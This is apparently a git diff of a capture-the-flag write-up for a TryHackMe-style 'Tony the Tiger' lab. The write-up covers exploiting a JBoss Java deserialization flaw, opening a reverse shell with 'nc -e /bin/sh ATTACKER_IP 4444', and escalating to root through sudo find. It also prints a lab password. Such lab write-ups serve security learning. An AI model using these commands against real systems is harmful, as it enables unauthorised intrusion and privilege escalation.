@@ -10,9 +10,9 @@ tags:
   - find
 ---
 
-| Difficulty |
-| ---------- |
-|    Easy    |
+| Difficulty |  |  IP Address   |  |
+| :--------: |--| :-----------: |--|
+|    Easy    |  |  10.10.104.15 |  |
 
 ---
 
@@ -78,13 +78,13 @@ PORT     STATE SERVICE     REASON         VERSION
 |_http-title: Site doesn't have a title (text/html).
 ```
 
-There are quite a number of ports open, but the ones I'm especially interested in are port **22** (SSH), port **80** (HTTP) and port **8080** (HTTP).
+There are quite a number of ports open, but the ones I'm especially interested in are port **22 (SSH)**, port **80 (HTTP)** and port **8080 (HTTP)**.
 
 The HTTP web server on port **80** contains a blog page:
 
 ![screenshot1](../assets/images/tony_the_tiger/screenshot1.png)
 
-The HTTP web server on port **8080** contains a **JBoss** application server:
+The HTTP web server on port **8080** contains a [JBoss](https://www.redhat.com/en/technologies/jboss-middleware/application-platform) application server:
 
 ![screenshot6](../assets/images/tony_the_tiger/screenshot6.png)
 
@@ -108,7 +108,7 @@ Next, if we look at the post titled '**My First Post**', we find something inter
 
 ![screenshot2](../assets/images/tony_the_tiger/screenshot2.png)
 
-Looks like there might be embedded data within the images on the site. Looking around, I managed to find **2** images. I downloaded them onto my machine and tried to see if I could extract any data from them.
+Looks like there might be embedded data within the images on the site. Looking around, I managed to find 2 images. I downloaded them onto my machine and tried to see if I could extract any data from them.
 
 In the end, the image that had embedded data was this:
 
@@ -126,7 +126,7 @@ The room tells us to download a zip file which contains the following resources:
 
 ![screenshot5](../assets/images/tony_the_tiger/screenshot5.png)
 
-**exploit.py** uses the **ysoserial.jar** file in the file to launch a **remote code execution** attack. It abuses a Java deserialization vulnerability that exists for certain versions of JBoss.
+**exploit.py** uses the **ysoserial.jar** file in the file to launch a remote code execution attack. It abuses a Java deserialization vulnerability that exists for certain versions of JBoss.
 
 ---
 
@@ -138,7 +138,7 @@ Source: https://www.rapid7.com/db/vulnerabilities/http-jboss-cve-2015-7501/
 
 ---
 
-We can use this exploit to launch a reverse shell on the target machine.
+We can use this exploit to launch a reverse shell on the target machine:
 
 ```
 python2 exploit.py 10.10.104.15:8080 'nc -e /bin/sh ATTACKER_IP 4444'
@@ -154,7 +154,7 @@ And we're in!
 
 ### [ Find User JBoss' flag! ]
 
-Looking around the machine, I find out that there are **3** users:
+Looking around the machine, I found out that there are 3 users:
 
 ![screenshot8](../assets/images/tony_the_tiger/screenshot8.png)
 
@@ -162,7 +162,7 @@ Visiting **jboss'** home directory, there is a hidden text file called **.jboss.
 
 ![screenshot11](../assets/images/tony_the_tiger/screenshot11.png)
 
-This file contains the JBoss flag:
+This file contains **JBoss' flag**:
 
 ![screenshot12](../assets/images/tony_the_tiger/screenshot12.png)
 
@@ -174,7 +174,11 @@ There is also another text file called **note**:
 
 ![screenshot9](../assets/images/tony_the_tiger/screenshot9.png)
 
-Nice, we have jboss' password! Let's log into his account via SSH:
+Nice, we have jboss' password! 
+
+> likeaboss
+
+Let's log into his account via SSH:
 
 ![screenshot10](../assets/images/tony_the_tiger/screenshot10.png)
 
@@ -182,9 +186,7 @@ If we look at jboss' **sudo privileges**:
 
 ![screenshot13](../assets/images/tony_the_tiger/screenshot13.png)
 
-We see that jboss can run the `find` command as **root**!
-
-[GTFOBins](https://gtfobins.github.io/gtfobins/find/) provides the following method to exploit this:
+We see that jboss can run the `find` command as root! [GTFOBins](https://gtfobins.github.io/gtfobins/find/) provides the following method to exploit this:
 
 ![screenshot14](../assets/images/tony_the_tiger/screenshot14.png)
 
@@ -198,15 +200,15 @@ sudo find . -exec /bin/sh \; -quit
 
 And just like that, we've opened a root shell.
 
-The root flag can then be found in **/root**:
+The **root flag** can then be found in /root:
 
 ![screenshot16](../assets/images/tony_the_tiger/screenshot16.png)
 
-It's **base64-encoded**, so let's decode it:
+It's base64-encoded, so let's decode it:
 
 ![screenshot17](../assets/images/tony_the_tiger/screenshot17.png)
 
-We get what seems to be a **MD5 hash**. We can try cracking it using my go-to online [hash cracker](https://hashes.com/en/decrypt/hash):
+We get what seems to be a MD5 hash. We can try cracking it using my go-to online [hash cracker](https://hashes.com/en/decrypt/hash):
 
 ![screenshot18](../assets/images/tony_the_tiger/screenshot18.png)
 
